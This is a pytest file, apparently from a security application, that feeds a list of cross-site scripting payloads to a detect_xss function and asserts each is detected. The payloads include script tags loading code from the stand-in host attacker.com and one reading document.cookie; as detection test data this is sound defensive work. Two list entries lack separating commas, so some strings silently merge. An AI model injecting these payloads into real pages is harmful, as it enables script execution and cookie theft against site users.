import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine, select
from sqlalchemy.orm import Session

from app import createAlert, database, eventsLogger
from app.detection.xss import detect_xss
from app.models import Alert, Event, User


@pytest.mark.parametrize("payload", [
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe onload=alert(1)></iframe>"
    "<input type=\"text\" onfocus=\"alert(1)\" autofocus>",
    "<input onblur=alert(1) autofocus><input autofocus>",
    "<select onchange=alert(1)><option>1</option><option>2</option></select>",
    "<textarea oninput=alert(1)></textarea>",
    "<form onsubmit=alert(1)><button>Submit</button></form>",
    "<a href=\"javascript:alert(1)\">Click me</a>",
    "<a onmouseover=alert(1)>Hover me</a>",
    "<button onclick=alert(1)>Click me</button>",
    "<details ontoggle=alert(1)>Toggle me</details>",
    "<video src=x onerror=alert(1)></video>",
    "<audio src=x onerror=alert(1)></audio>",
    "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationend=\"alert(1)\"></xss>",
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(\"XSS\")</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(window.location)</script>",
    "<SCRIPT>alert(1)</SCRIPT>"
    "<ScRiPt>alert(1)</sCrIpT>",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
    "<script src=\"http://attacker.com/xss.js\"></script>",
    "<script/src=\"http://attacker.com/xss.js\"></script>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<script>setTimeout(function(){alert(1)},100)</script>",
    "<script>/* */alert(1)//</script>",
    "<script>",
    "alert(1)",
    "</script>"
])
def test_detects_common_signatures(payload):
    assert detect_xss(payload)

